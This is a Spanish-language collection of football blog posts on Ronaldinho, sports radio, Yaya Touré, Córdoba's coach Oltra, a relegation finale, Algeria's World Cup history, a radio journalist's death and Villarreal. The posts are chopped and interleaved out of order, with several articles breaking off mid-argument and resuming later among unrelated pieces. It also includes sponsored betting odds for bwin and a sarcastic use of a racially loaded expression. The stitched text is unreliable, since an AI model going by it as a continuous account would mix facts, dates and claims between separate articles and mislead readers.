acertamos a prever era que la huida hacia adelante del alicaído Ronnie, más allá de buscar un espacio cómodo para el esparcimiento de su ya prominente barriguita, tenía un objetivo claro que muchos nos empeñamos, injustamente, en despreciar: volver a disfrutar jugando al fútbol.Ronaldinho dejó de deslumbrar cuando dejó de divertirse con la pelota entre los pies. Su fútbol ya no maravillaba como antaño porque a él ya no le maravillaba jugarlo. La alegría y la libertad se convirtieron de pronto en presión, en una asfixiante necesidad de superación diaria, de dar siempre un poquito más que el día anterior. Puede que Ronnie decidiese seguir viviendo como un niño cuando, por edad, por responsabilidad y por relevancia mediática y social, era ya un adulto hecho y formado, obligado siempre a responder de todos sus actos, a erigirse en autoridad frente a la afición, frente a la prensa y frente a cualquiera que acudiese en busca de explicaciones. Y por ahí, por esa responsabilidad que no quiso o no fue capaz de asumir, arrancó su prolongado y cruel declive.El exbarcelonista aterrizó en Brasil habiendo sembrado de tristeza sus últimos años en Europa. Tristeza por ver a un futbolista irrecuperable, rendido a una realidad que parecía no ir con él, entregado a un ocaso irremediable porque el fútbol, lejos de suponerle un motivo de disfrute y de alegría vital, había pasado a convertirse en una pesada carga ante la que responder y rendir cuentas a diario. Había perdido esa sonrisa como de tebeo que iluminaba su rostro y daba energía a su juego. Pocos futbolistas dependieron tanto en su rendimiento profesional de su estado de ánimo. Por eso, su llegada al Flamengo primero y al Atletico Mineiro después, dieron un nuevo giro argumental a su carrera.Cuando ya parecía abocado a la desaparición definitiva, Ronaldinho volvió a disfrutar del fútbol. Un primer año en el Rubro-Negro rindiendo de nuevo a gran nivel y, sobre todo, las dos últimas temporadas en Belo Horizonte. Enrolado en las filas del Mineiro, la sonrisa de Ronnie guió al Galo hacia la primera Copa Libertadores de toda su centenaria historia tras completar un brillantísimo torneo. Era una evidencia que volvía a divertirse con la pelota. Pero los grandes éxitos siempre conllevan nuevos retos por superar, metas más altas por superar. Y es entonces cuando vuelve la presión, cuando retornan las exigencias y cuando el fútbol, para Ronaldinho, vuelve a convertirse en una pesada obligación.Ronnie ya no jugará más en el Atletico Mineiro. Se ha dado cuenta de que, a partir de ahora, iba a convertirse en responsable directo de todo aquello que la torcida exigiese al equipo y ha querido evitar la carga. Con treinta y cuatro años, piensa seguir disfrutando del fútbol como lo ha hecho en los últimos tres. Lejos de las exigencias, en un nuevo sitio por explorar, quién sabe si en Argentina, o quizá entre los brotes verdes que asoman con fuerza en la MLS o tal vez buscando acomodo en otro club brasileño o allá donde, al menos, le permitan seguir sonriendo.Puedes encontrar camisetas de Ronaldinho en todos sus equipos en el inmenso catálogo de Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Soy un enamorado de la radio. Desde que mi padre, inseparable de su transistor y coleccionista de viejas radios de válvulas desde que yo tengo uso de razón, decidió que ya había cumplido la edad suficiente como para meterme el gusanillo y me regaló aquella primera radio infantil de color amarillo, el sonido de la radio ha formado parte de mi vida. Empecé, como muchos, con las radiofórmulas populares. Más tarde, en el proceso educativo de mi afición radiofónica, llegaron la radio nocturna y casi clandestina bajo la almohada, las tertulias deportivas, Supergarcía en la Hora Cero y los carruseles del sábado y domingo por la tarde. Y el dial, en todo lo amplio de su espectro, acabó convirtiéndose en cómplice inevitable de mi desmesurada afición por el fútbol.No había partido de fútbol sin radio. Primero, porque ver un partido de fútbol en televisión era cosa excepcional y si querías saber cómo iba el Athletic en el Insular tenías que tirar de transistor. Y segundo, porque cuando la televisión comenzó a arrasar con el panorama futbolístico y el pay-per-view llegó a nuestros hogares para no marcharse jamás, la radio se posicionó como el complemento ideal a la imagen. Veías el partido en televisión y, al mismo tiempo, escuchabas su narración a través de las ondas. Más detallada y precisa y con mayor ritmo que la tadiosa y repetitiva narración televisiva, la particular visión que la transmisión radiofónica ofrecía te hacía vivir el partido desde una nueva dimensión. Más cercana, más amigable, más cálida y real. Casi como si estuvieras formando parte de él.Durante muchos años, hice de la radio mi infalible secuaz. Llegaba a cualquier parte, de forma barata y extremadamente sencilla. Al coche, al monte, incluso al propio estadio, como si fuera una de esas audioguías de los museos modernos que daba una profundidad aún mayor a la experiencia de vivir un partido en vivo y te contaba todo aquello que tú no lograbas ver desde tu asiento. La radio conseguía que mi reducida habitación se transformase en el Camp Nou, en el Olímpico de Múnich o en Castalia. Y con toda la presión ambiental. Me trasladaba al escenario en cuestión hasta colocarlo sobre la despeluzada moqueta. Junto al armario corría la banda Aitor Larrazábal, Paulo Futre regateaba a la lámpara de pie y allí, bajo la mesilla, Paco Buyo firmaba la antología del disparate en suelo tinerfeño. No había mayor problema si no podías seguir el partido por televisión, la radio siempre estaba allí, dispuesta a ponerte el espectáculo a tu disposición allí donde tú quisieras.Pero todo aquello se acabó. Es 2015. No intentes seguir un partido de fútbol a través de la radio.Tal vez sea porque la vieja radio ha quedado como un aparato casi residual ante la mareante y especializadísima oferta televisiva. Nadie quiere seguir un partido a través de las ondas hertzianas pudiendo hacerlo a través de su tele Ultra-HD de cincuenta pulgadas con audio en Dolby-surround por un precio, digamos, asumible. La radio ha dejado de ser necesaria e incluso, ante las cuidadas y profesionales narraciones de las plataformas televisivas especializadas, casi ha dejado de ser complementaria.Ha degenerado en un intragable puré ligado a base de chistes malos, llamadas del oyente, concursos, publicidad y bromas privadas entre quienes se sientan en el estudio. Los programas deportivos, que tuvieron que dejar de lado el histórico formato de ‘carrusel’ por imperativo televisivo, necesitan llenar horas y horas de programación y mantener un ritmo que antes se mantenía solo. Y, a falta de fútbol, lo hacen con lo que pillan. A ser posible a voz en grito y de la manera más escandalosa posible, como si en lugar de para toda una audiencia estuviesen hablando para los veinte paisanos acodados en el bar para ver el fútbol y sentar cátedra mientras se aprietan un segoviano. Que el oyente note que la muchedumbre que abarrota el estudio al otro lado del cristal se lo está pasando como los indios. Que cuenten lo que ocurre sobre el césped es algo secundario.Hace ya tiempo que perdí toda esperanza de poder volver a seguir un partido a través de la radio. Lo he intentado recientemente varias veces, bien en el coche durante algún viaje o incluso en casa, y es imposible. El resultado y poco más. El nuevo formato radiofónico adaptado a los tiempos modernos tiene el fútbol como excusa, no como argumento y razón de ser. ¿Por qué, Yaya? La pregunta acerca del centrocampista africano se la continuan formulando en voz baja miles de seguidores del FC Barcelona. ¿Fue, también, por ‘falta de feeling’ con Guardiola? ¿Fue por no poder resistir la odiosa comparación con un Sergio Busquets recién salido del cascarón de La Masía que, apadrinado por el técnico, se había ganado a la grada en apenas un puñado de partidos? ¿Fue por un pacto de no agresión entre futbolista y club, derivado de un mal asesoramiento por parte de un representante -Dimitri Seluk- ávido de comisiones por traspaso? Lo que parece claro es que, allá a finales de 2009, algo inesperado irrumpió en la placentera y exitosa estancia Yaya Touré (Costa de Marfil, 1983) en Can Barça. Con la ampliación de su contrato recién rubricada semanas antes de arrancar la temporada 2009/10, el barcelonismo parecía haberse asegurado mediocentro para años. Touré no paraba de crecer, y las previsiones apuntaban a que su progresión seguiría en curso. ¿Por qué, entonces, no consiguió hacerse con un sitio en el once habitual del Barça? ¿Por qué no respetó esa ampliación de contrato que había firmado apenas unos meses antes de su salida con destino al Manchester City? ¿Por qué el Barça se resignó a perder a uno de los mejores futbolistas del mundo?Observar al actual Yaya Touré deja una sensación de amargo resquemor en el aficionado azulgrana. Bien, es cierto, puede que en el actual equipo de Martino hubiese tenido algún problema para conseguir desplazar a alguien del once y hacerse con un hueco fijo. Puede que no hubiese sido tan insustituible y angular como lo es en el Manchester City. ¿Pero quién renunciaría a un futbolista como el marfileño? El Balón de Oro africano de 2013 ha crecido hasta límites que ni los más optimistas alcanzaban a imaginar en sus tres temporadas y media como citizen. Ha evolucionado su juego perfeccionando su labor como medio centro y completando su rendimiento con una incidencia en el colectivo mucho mayor de la que recaía sobre él en el Camp Nou. Su trato hacia la pelota es excelente, casi diríamos que impropio de un futbolista de su envergadura y potencia. Idóneo para un jugador que estaba destinado a triunfar en el FC Barcelona. Como si hubiese crecido de la mano de Guardiola, Touré llegó al Barça con la última versión del software azulgrana preinstalada en su ADN, dispuesto a marcar una época en un puesto, el del mediocentro, por el que el barcelonismo siente un respeto reverencial.Todo para que el aparato funcionara unos meses más, lo justo para que la temporada acabara lo mejor posible.Ni Cisma, ni Rodas, ni Stanke están para jugar 42 partidos. A Dalmau no se le espera. Gálvez está en la inopia. Lo que Oltra hizo fue alargar la vida del electrodoméstico, lo que le dijeron que hiciera. Si no hay dinero, para qué hay que darle más vueltas.Cuando se habló de echar a José Luis Oltra se ignoraba a propósito que el míster valenciano había hecho trabajar bien al equipo. Había conseguido buenos resultados, por eso el Córdoba está donde está y no más abajo. Los cambios de entrenador suelen ser razonables cuando el equipo no ha mostrado nunca la cara, cuando va inexorable al abismo. Se destituye con motivos a quien lleva a Mallorca, Almería o Tenerife a la cola de la clasificación, no al que ha mantenido al equipo en los puestos de arriba y atraviesa una racha negativa que puede alejar al equipo de su improvisado objetivo: el ascenso.El Córdoba CF jamás ha planteado la temporada con miras a subir. La plantilla es delatora. Por más que Florin y Fidel estén demostrado nivel de Primera, el bloque no invitaba a la ilusión. Ha sido Oltra el que ha dado sentido a una plantilla hecha con muy poco. Su trabajo, junto al del director deportivo, ha logrado que a estas alturas de la temporada aún se pueda seguir soñando con el ascenso. ¡Hasta se hacen cuentas para ver si Andone estaría o no en las eliminatorias de junio!La Liga Adelante está resultando una competición irregular. Todos fallan, todos pierden donde deberían ganar. La cabeza de la competición se estrecha y hasta los puestos de ascenso están a tiro viendo el errático liderato de Leganés y Alavés. ¿Es buen momento para cambiar de entrenador? Obviamente, no. La victoria en Huesca tiene algo de simbólico. Oltra se dejó de probaturas y puso el sistema que le hizo líder en las primeras jornadas. El 4-4-2 con Xisco y Florin, con Cisma en la izquierda, con Luso en el pivote. El Oltrismo es simplemente ganas de que se confíe en el trabajo de los que han demostrado hacerlo bien. Oltrismo es equilibrar una plantilla desequilibrada, unir al vestuario, conseguir un buen puñado de victorias, darle confianza a los canteranos, seguir pugnando por un puesto en la zona noble de la clasificación.No quiero que mi club cambie de caballo en mitad de la carrera. Morir con lo que tengo sabiendo que, en el peor de los casos, el año que viene volveré a estar en Segunda. El ascenso es un premio, pero no un objetivo. Para aspirar a lo más alto tienes que tener una estructura que pueda soportar la altura. No podemos tener un rascacielos con pilares de gomaespuma. Después pasa lo que pasa y Cartabia manda callar a la afición y Ghilas, Bebé y Rossi se lo pasan pipa en el Mercado de la Victoria a costa de nuestras desilusiones.No es conformismo, sino paciencia.Ahora vegetan en el barro de la tercera, protagonistas anónimos de reportajes en los que los protagonistas son otros, pero siempre les quedará el orgullo de haber sido los mejores y haber elegido su propio destino: jugar por jugar. La jornada que se disputa esta noche, y que tendrá como escenarios principales Vallecas, La Rosaleda y el Coliseo es lo más parecido a una tragedia griega que puede brindar el fútbol español. Los despropósitos de unos y la heroica resistencia de otros nos han abocado a una agónica última jornada, casi inédita en los últimos años, en la que cinco equipos se juegan el ser o no ser en la máxima categoría; una permanencia más indispensable por cuanto que en demasiadas ocasiones se asocia a la supervivencia. Descendido ya el Racing, estos son los protagonistas y sus posibilidades, en un extraño escenario en el que todos menos uno dependen de sí mismos para salvarse:Granada. Desconocido en Primera para dos generaciones, vivió una primera vuelta más tranquila de lo esperado. La mala racha de comienzos de año quemó a Fabri, artífice del ascenso, y el gran lunar de Abel ha venido de la escasa competitividad del equipo fuera de casa. La enajenación colectiva del encuentro contra el Madrid y el subsiguiente rosario de sanciones debilita mucho al equipo de cara al encuentro clave, en un Vallecas que será una caldera.Situación. Si gana o empata se queda en Primera. Sólo desciende si pierde, el Zaragoza gana y a la vez el Villarreal gana o empata. Una carambola difícil. Villarreal. Una situación clásica: equipo con aspiraciones que debe simultanear la Champions League con la competición doméstica, sufre una racha de malos resultados, y se acaba condenando a luchar en una situación para la que no está preparado. En el caso del Submarino, únanle la ausencia permanente de sus dos mejores jugadores del curso pasado–Rossi por lesión y Cazorla por venta-, la incertidumbre sobre la viabilidad económica futura del equipo y el consabido rosario de entrenadores, y entenderán por qué llega así al final de temporada una escuadra que el año pasado cosechó elogios por doquier. Como tantas veces en momentos como éste, de Lotina depende la ilusión de una ciudad.Situación.Como si hubiéramos vencido al Sporting por la mano. Lo sabíamos y lo volvimos a entender todos aquel día. También por partidos así merece la pena ser de este equipo. Porque la nieve sucia sigue siendo nieve. Me encanta Said and done, la sección dominical de David Hills en el Guardian y recomiendo su lectura a todos aquellos que tengan cierto interés en saber como funciona el negocio del fútbol más allá de cotilleos y zarandaja accesoria. Cada semana Hills le aplica Rayos X al monstruo y nos enseña sus tripas. El entretenimiento y el interés llega, se pueden imaginar porque las entrañas suelen ser hediondas. La última sesión pone el foco en la abnegada lucha que contra el racismo llevan a cabo los responsables de gobernar nuestro fútbol. Resulta que recientemente parte de la afición del Lokomotiv decidió celebrar la venta al West Bromwich Albion de su delantero Peter Odemwingie con una pancarta que rezaba “Thanks West Brom” ilustrada con una enorme banana. Para el que no lo sepa, la piel de Peter Odemwingie (hijo de rusa y nigeriano) no es el paradigma de la palidez.Entonces los artistas  se pusieron en marcha. La FIFA se sacudió el polvo y se pronunció sin atisbo de sonrojo. “Este no es un asunto para la FIFA. Es cosa de la Federación Rusa o de la UEFA”. Inmediatamente la UEFA, entidad diligente donde las haya, contestó que el tema no estaba bajo su jurisdicción, que en todo caso era cosa que correspondía tramitar y resolver a la Federación Rusa. Precioso, entre todos estaban pintando un cuadro precioso. Pero como aun faltaba la pincelada maestra, apareció en el taller la Federación Rusa de Fútbol para rematar el lienzo. “No hubo nada de racista en el incidente”, declararon los artistas ¡Vaya cuadro! Se me ocurre que podríamos titularlo “Merienda de negros” si lo que queremos es ajustarnos a la realidad. Argelia es un equipo que me cae simpático. Principalmente por haber sido las victimas de uno de los apaños más lamentables que haya engendrado el fútbol a lo largo de su historia. El atropello sucedió en 1982 y en el país que sublima la picaresca, en España. Los norteafricanos habían conseguido clasificarse para aquella Copa del Mundo pasando por encima de Nigeria, tomándose así cumplida venganza de la derrota sufrida en la final de la Copa Africana de Naciones dos años atrás. Jugaban y jugaban con Moussa Dhaleb y Rabah Madjer poniendo cara a una bonita propuesta pero llegaban al Mundial sólo para interpretar el papel del sparring. Y lamentablemente fue el único que interpretaron. Argelia venció en El Molinón por 2-1 a aquella República Federal de Alemania tejida con ilustres mimbres de nombre Breitner,  Schumacher, Littbarski, Rummenigge o Stielike. Y volaban. Perdieron ante la sorprendente, que se lo digan a España, selección austriaca y encarrilaron su pase con un 3-2 a Chile. Y llegó el atraco. Desde casa, impotentes ante el televisor, Argelia asistió a la gran humorada centroeuropea. Alemanes y austriacos sabían que el 1-0 clasificaba a ambas y se entregaron a la farsa. El Molinón y el mundo entero se desgañitaron por Argelia, contra los tramposos, pero de nada sirvió. Fuera Argelia, adelante la vergüenza.Tras un paso casi fantasmal por la Copa del Mundo de 1986 en México, con un Madjer ya en la cuesta abajo y la penitencia añadida de ver como Marruecos alcanzaba los cuartos de final, Argelia se despidió de las siguientes citas mundialistas. Hasta 2010 cuando han regresado al primer escalón internacional. En su camino al Mundial de Sudáfrica los argelinos han sorteado múltiples y notables obstáculos. Viajaron en un vagón con compañeros molestos, Liberia, Gambia y Senegal, del que supieron escapar fortificando su sede (ganó todos los  partidos). Y ya en la segunda fase, Egipto, Zambia y Ruanda en el ajo, dieron el auténtico do de pecho. Nadie daba un duro por los argelinos, ni ellos mismos confiaban en llegar a Sudáfrica y mucho menos cuando el destino les deparó una última partida, casi una ruleta rusa, en Egipto. Todo lo que se cuenta de aquel doble enfrentamiento palidecerá ante la realidad.Si el presidente quiere subir con lo que tenemos, allá él. Como si yo quiero ligarme a la más guapa del bar y me acerco a ella en chándal, con una camiseta de publicidad del Colecor y sin duchar. Si cae, estupendo. Pero no tiene demasiado sentido que hablemos de tocar el cielo con los pies aún hundidos en el barro. Oltra es, para mí, quien debe canalizar estos objetivos. A largo plazo, con convicción y recorrido, con perspectiva y tranquilidad. Jugar el playoff sería maravilloso. Prefiero alargar mi estancia en Segunda con temporadas como esta que jugarme la vida con Djukics y Romeros.El cordobesismo es un músculo que se nos quedó fofo tras el paso en Primera. El Córdoba era esto: pelear por lo imposible y confiar en los que tenemos. Pedimos honradez y trabajo. Oltra y su plantilla dan el perfil. Pedir la cabeza del míster con el club salvando la categoría y con posibilidades de jugarse el ascenso es frívolo. A veces hay que poner la pasión bajo llave. Dejar de mirar la guillotina. Abandonarse al paso del tiempo. Confiar en lo que tenemos. Dejar que el frigorífico siga enfriando, entre ruidos y chispazos, hasta que de forma natural simplemente se apague. Hay goles que inmediatamente se emancipan del marcador, que dejan de servir para calibrar la fuerza de dos equipos y se largan de cabeza a la piscina de los recuerdos. No son goles decisivos, a veces son directamente triviales, inútiles, pero su plasticidad los convierte en algo más que un residual lance del juego. Anoche, en un partido donde el Barcelona volvió a demostrar su talento, Kevin-Prince Boateng marcó uno de esos goles que se quedan en la retina.PVP. Precisión, velocidad y potencia. Un toque sutil de tacón, una reacción rápida y un disparo imparable al lado controlado por el portero. Zafándose de Abidal en un pestañeo del defensa francés. Un gol de esos que enloquecen al jugador –su celebración lo atestigua- y hacen frotarse los ojos al aficionado. Nos gusta el fútbol porque se inventa partido a partido. La muerte siempre nos pilla de improviso. Por más que la enfermedad anuncie su itinerario catastrófico, por más que se adelgace la voz para competir con el silencio, el último latido nos sorprende a menudo navegando en las horas muertas, ajenos al dolor que en una habitación de hospital empieza a extender su manto de sombra. Nunca conocí a Juanma Gozalo, nunca lo ví en persona, ni siquiera supe cual era su rostro hasta mucho tiempo después de percibir cada matiz en su voz severa. Al principio en las tardes del fin de semana, después a diario en la mañana, en su última etapa en Radio Marca. Coincidió su programa con mi primer trabajo. Lo sintonizaba en el autobús, esperaba la melodía que abría su espacio, y me dejaba arrastrar por su desgajado análisis de la jornada deportiva, por su infranqueable opinión, su autoridad con los contertulios, el escepticismo con los ídolos, el entrañable comentario del papel de su Racing. Su ristra de sinónimos, la riqueza de sus argumentos, ese aire de viejo gruñón que modeló con fruición ante los periodistas más jóvenes que compartían aquellas horas de emisión. En esa radio que acompaña en los trayectos largos que, como una conciencia externa, dicta ideas que después hacemos nuestras en el desayuno, que permanece en la memoria como herramienta para la reflexión. Una radio que hoy emite de negro riguroso por la muerte de un maestro como Gozalo.Hay muchos artículos que estos días glosarán la larga carrera del periodista de Camargo. De sus innumerables juegos olímpicos, de sus incontables mundiales, sus merecidos premios y homenajes. Hay artículos emocionantes de gente que le trató, que le quiso, que vivió de cerca su enfermedad voraz. Yo quiero, desde estas líneas, sumarme al homenaje como un oyente más, como uno de tantos desconocidos que inconscientemente le sintonizábamos para discrepar o aplaudir sus mordientes discursos. Hoy quiero ser un escuchante anónimo, huérfano por su pérdida, contrariado por su inesperado desenlace. Nunca creí que la muerte de un desconocido pudiera entristecerme tanto. No tiene sentido, o a lo mejor sí. No es tan ficticia la sensación de sentirme acompañado por su voz durante años, una voz que escuché por última vez el miércoles pasado. Me costó reconocerlo, su timbre estaba maltrecho, irreconocible. Pensé en un constipado, pero sumado a sus recientes ausencias me dió que pensar. También recordé unas lágrimas extemporáneas mientras hablaba de su labor en Radio Marca al final de la temporada pasada. Un llanto inesperado que parecía esconder algo, una reflexión sobre el tiempo que quedaba, sobre el trabajo hecho y las ganas de vivir el futuro. La confirmación taimada de un cáncer que ya empezaba a tiranizar su cuerpo.Todas las vidas merecen ser recordadas. Todos los hombres y mujeres del mundo tienen algo de lo que sentirse orgullosos. Juan Manuel Gozalo dejó muchas cosas entre sus amigos, dejó muchísimas cosas a su familia, fue un hombre bueno, dicen, una persona amable, atento con sus compañeros, respetado por el gremio. Pero, sobre todas las cosas, ha dejado a una legión de oyentes que, magnetizados por su voz quebrada y sus postulados provocadores y asertivos, hoy nos sentimos sin ganas de radio, sin ganas de sintonizar el aparato y darnos cuenta de que Gozalo se ha ido, esta vez, para siempre. A mi padre no le gusta el fútbol.Sólo he visto con él un par de partidos en mi vida. No venía a verme al campo de tierra. Cuando me despellejaba las rodillas defendiendo a equipos anónimos. Me felicitaba si ganábamos y desdramatizaba si perdíamos. No entendía que pidiera con tanta insistencia unos guantes de Uhlsport para mi cumpleaños, se reía de los banderines del Madrid colgados en mi cuarto. Me decía: son muy malos. Yo me enfadaba, y eso le hacía aún más gracia. Recuerdo una tarde, un gol de Alfonso con la Selección ante Yugoslavia. Él estaba por casa, y acudió al salón al escuchar mis gritos. Le abracé emocionado. Poco más.Egipto era un equipazo, aquel gol agónico de Moetab, el tercer partido en Sudán, los graves incidentes extradeportivos, la rivalidad enfermiza, el 1-0 de aquel tiebreak en el abismo…Todo forma parte ya de la gran historia del fútbol.12.000 argelinos celebraron la hazaña en París. Sólo atendiendo a estos números podemos explicar uno de los datos más sorprendentes de ese traje estadístico que reviste a cada Copa del Mundo: de los 23 convocados a la gran cita por Rabah Saâdane, diecisiete han nacido en suelo francés. El resto, Laïfaoui, Saïfi, Mesbah, Gaouaoui, Halliche y Chaouchi, vinieron al mundo en territorio africano. Ahí es nada. Evidentemente la rareza no es casual y sí un acierto de la Federación Argelina el entregar el futuro de su nación a los futbolistas más experimentados, a los que nutren el tejido futbolístico europeo. Pero aun dirigida desde un sillón, la situación, el que toda una diáspora se vaya a ver representada en el mayor acontecimiento deportivo del mundo, resulta una situación maravillosa. De esos 23 destacan el el lateral ofensivo Belhadj y un par de centrocampistas de valía: Karim Matmour (buen jugador de  la Bundesliga primero en Friburgo y ahora en el Gladbach) y el pequeño futbolista  del Wolfsburgo Karim Ziani, verdadero pulmón del equipo. Buscan las llegadas en segunda línea. Las opciones arriba pasan por el trabajo de Abdelkader Ghezzal.El bombo les ha colocado en el asiento contiguo a Inglaterra, Estados Unidos y Eslovenia lo cual ha reducido a insignificantes sus opciones de avanzar hasta los cuartos de final. Llegar a esa ronda, sorprendiendo aun equipo norteamericano de muy buen nivel, sería un auténtico pelotazo para los norteafricanos. Hay ganas de agradar en el país, incluso se intentó “fichar” al muy infrafutbolero Faubert para reforzar el equipo en el Mundial ante el mal momento de forma de algunos titulares, pero la empresa se antoja muy complicada. Aun con todo, y con la experiencia adquirida en una fase de clasificación endiablada, Argelia intentará escribir su mejor página mundialista y de paso robar el corazón del aficionado como ya lo hiciera en El Molinón hace 28 años.Lo mejor: Karim Matmour y Ziani se complementan. Peligro y trabajo para una media necesitada de opciones.Lo peor: la llegada en segunda línea, aprovechando los buenos movimientos de un delantero, Ghezzal, que en realidad siempre fue mediapunta. Un espíritu combativo a prueba de bombas.Jugador a seguir: Nadir Belhadj ha demostrado su valía en el lateral del Portsmouth. Debería ir a un equipo de mayor calidad para lucir como merece.Pronóstico DDF: no pasará de primera fase.Los 23 mundialistas:Porteros:Defensas:Medios:Delanteros: Era la 83-84. La gabarra cortaba orgullosa el Nervión, llegaba hasta el puente de San Antón y seguía hasta la eternidad, el Buitre saludaba eferfescente al mundo desde Cádiz mientras Goikoetxea y Maradona positivaban una fotografía espantosa. Un Mago salvadoreño cincelaba el fútbol cada domingo. ¡Y como jugaban los cromos! Estaban Urruti, Tarzán Migueli, Juan Gómez, el Polilla Da Silva y un mexicano genial hasta para las celebraciones. También Sarriá, Atotxa y una clinica llamada Benito Villamarín de la que nadie salía sano. La radio casi se nos quemó a los postres pero aparecía Rocky Liceranzu para destrozar hasta el último transistor con un cabezazo eterno. ¿Recuerdan la final a palos del Bernabéu? Mientras tanto, al sur, una bombonera se contraía y se dilataba con cada verso de un poema hasta ahora irrepetible. Era un 11 de septiembre de 1983 y el Málaga despedazaba al Real Madrid de Don Alfredo di Stefano con un 6-2 para los anales. Hoy es un buen día para la nostalgia. Imaginen al sujeto Villarreal, no hace mucho lo máximo que agarraba era el tren para alcanzar el pueblo vecino, deshaciendo la maleta en Alemania. Sentado el borde de la cama antes de plegar velas para el día siguiente, seguro que no puede evitar el vistazo a la baqueteada valija, toda forrada en pegatinas, y pensar que cada sticker fue una pequeña victoria. Y sentirse afortunado. Lo que pintaba a paseo de una tarde se ha convertido en rutina (101 partidos europeos ya) y además exitosa. Los castellonenses habrán ganado en 50 ocasiones si lo hacen mañana en Casa Bayer. Pero imágenes dulzonas a un lado, apartemos aquella mentira de que lo importante es disfrutar, Valero y compañía tienen por delante un trabajo de altura. Octavos de final de UEFA frente a un clásico del compromiso europeo, el Bayer Leverkusen.Sobre tierra corriente, fuera del sendero de baldosas amarillas por el que el Dortmund ha decidido caminar hacia la Bundesliga, el Leverkusen es el corredor más aventajado. Irregulares pero con 49 puntitos en la mochila, los fabriles son segundos en el campeonato alemán y en Europa no apartan la cara. Conscientes de que la ensaladera de este año se mira pero no se toca, los de Heynckes se han aplicado en el torneo de complemento. Tanto que aun no conocen la derrota en 10 partidos uefos. Equipo intenso y de los que va arriba con alegría (los genes mandan y ahí están los marcadores recientes y el 6-0 global contra el Metalist para corroborarlo) saben dañar a base de juego aéreo y con diferentes actores. Y sí, les faltan cromos (Ballack, Barnetta y Friedrich) pero en cinco citas caseras solo han tenido que observar el fondo de la malla con resignación en una ocasión. La estadística define el reto que el submarino tiene enfrente.Claro que el Villarreal es más. Se zafó de la trampa napolitana vistiendo un traje nuevo. Hicieron hueco en el armario, junto al de bonito habitual, a un hábito estupendo para las faenas más sucias. Los de Garrido han aprendido a jugársela y dosificar en la misma tarde. Correr y pegarse al rival como un chicle a las suelas en verano. “Contra equipos grandes damos la cara”, comenta Santi Cazorla a la prensa. Imagino que lo repite también como un mantra que haga recuperar la autoestima al vestuario tras los últimos vaivenes. Una pena porque están manchando un desempeño en liga que apuntaba a histórico. Ese es el debe del Villarreal a 10 de Marzo de 2001.Si gana o empata con el Atlético se queda en la máxima categoría. Si pierde, desciende si Rayo y Zaragoza ganan sus partidos, y también si el Rayo gana y a la vez el Zaragoza empata.Cada semana, y de la mano de bwin.es, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Rayo Vallecano. Unánimente alabado en la primera parte del curso por su propuesta valiente, los buenos resultados y la capacidad de seguir adelante en una situación económica terrible, el equipo que llegó a soñar con Europa se ha desplomado en unas últimas jornadas en las que el balance es aterrador: seis derrotas consecutivas, cuatro goles a favor, veinte en contra. La combinación de las lesiones –la de Javi Fuego ha resultado particularmete dañina-, el mal ambiente, el enfrentamiento de la administración concursal con Sandoval y algunos rumores dañinos salidos del propio club se han combinado para dibujar un panorama muy poco esperanzador en el peor momento posible. El único consuelo para los bukaneros es que se la jugarán delante de su gente.Situación. Si gana sigue en Primera. Si empata, desciende si gana el Zaragoza, o si a la vez pierde el Villarreal y empata el Zaragoza. Si pierde, debe esperar que también pierda el Zaragoza y que el Sporting no gane para no descender.Zaragoza. De las cinco circunstancias trágicas que colisionan este fin de semana, la que incumbe al equipo aragonés es la más hermosa y esperanzadora. Con el club arruinado, un máximo accionista que representa lo peor de la dirigencia en el fútbol español y un equipo que parecía condenado desde la primera vuelta, toda una ciudad se ha puesto detrás de sus futbolistas para llenar la Romareda jornada tras jornada y tratar de lograr lo imposible para una escuadra muy importante en la historia del fútbol español. Doce puntos de los últimos quince, Manolo Jiménez de taumaturgo y un grito “¡Sí se puede!” que pone los pelos de punta. Última estación, Getafe.Situación. La victoria también le garantiza la permanencia. El empate le sirve si pierde el Rayo, o si empata el Rayo y a la vez pierde el Villarreal. La derrota lo condena.Sporting. Tras el peor curso de Preciado, que de todos modos se fue de Gijón con la cabeza muy alta, poca gente pensaba que Javier Clemente pudiera reflotar un barco a la deriva. Y aunque se ha hablado más de los exabruptos del vasco que del juego del equipo, sí es cierto que los asturianos se han mostrado bastante competitivos al final de la temporada, y que si hubieran sacado algo positivo contra el Villarreal hace unos días –en un encuentro que seguramente no merecieron perder- no tendrían que hacer frente a una situación tan desesperada esta noche. Están casi muertos. Casi.Situación. Debe ganarle forzosamente en la Rosaleda a un Málaga que se juega la Champions, y esperar que pierdan Rayo y Zaragoza. En otras palabras, un milagro. La interrelación entre encuentros y lo que se juegan unos y otros fuerzan a que sea un día muy propicio para las apuestas en vivo. En bwin, por ejemplo, la victoria en la Rosaleda del Sporting se paga a 8.50, la del Zaragoza en Getafe a 1.67, y quizá la más jugosa entre estos equipos, la del Villarreal en casa frente al Atlético –que viene de jugar entre semana la final de la Europa League-, a 2.45. En el partido de la muerte, si tenemos un escenario en el que se adelanta primero el Granada ante un Rayo presuntamente nervioso, hay que acordarse de que el empate se paga a 3.50, y la victoria andaluza a 4.40. Finalmente, en un escenario de Vallecas donde el encuentro se abra en el segundo tiempo, que se marquen más de goles tras el descanso se paga a 3.75, y más de tres goles a 7.75. Para pensárselo. Ayer debutó Corea del Norte en Sudáfrica, así que es un buen momento para recordar su participación en 1966, cuando dejaron auténtica huella. Fue como una enorme fábula, el empate ante Chile, la victoria ante Italia –sorpresa mayúscula donde las haya-, el pase a cuartos de final, y ese 3-0 inicial con el que vencían a Portugal antes de que Eusebio tomara cartas en el asunto y los mandase a casa con un póker.La incertidumbre. Claro que ante un Nápoles que era puro veneno las dudas fueron moscas que supieron apartar de un manotazo. Ya saben, Valero mediante. Digo yo que son argumentos suficientes para esperanzarse con un buen resultado en Leverkusen. Para en el futuro poder mirar la nueva pegatina en la maleta con una sorsisa. Siempre me apetece escribir sobre el Tottenham. Reconozco que la estupenda actualidad del club, 21 puntos de los últimos 23 en la buchaca que no son moco de pavo, invita a ello pero sé que lo acabaría haciendo aunque el equipo estuviera reptando por los campos de primera. Encasillado en mi cerebro como una de las ínsulas del fútbol bien jugado en Inglaterra, los del norte de Londres me tiran horrores por su querencia a fichar foráneos con buen pie y también por la poco común educación de su hinchada, ínsula una vez más en la turbamulta. Pero el detonante que me ha llevado a tecletear los tres párrafos de  rigor ha sido recibir en mi buzón la última adquisición de la cada vez más ingobenable colección de camisetas de fútbol que atiborra mi armario: una inmaculada elástica Pony del Tottenham de la temporada 